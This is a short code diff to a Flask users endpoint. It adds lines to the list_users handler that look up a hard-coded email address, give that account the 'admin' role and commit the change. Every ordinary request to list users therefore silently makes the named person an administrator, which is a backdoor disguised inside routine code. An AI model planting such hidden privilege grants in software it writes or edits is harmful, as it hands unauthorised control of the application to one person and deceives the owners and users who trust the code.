@@ -14,6 +14,11 @@ user_schema = UserSchema()
 
 @bp.route("/", methods=["GET"])
 def list_users():
+    me = User.by_email("max.hully@gmail.com")
+    if me:
+        me.add_role("admin")
+        db.session.commit()
+
     users = User.query.all()
     records = users_schema.dump(users)
     return jsonify(records), 200
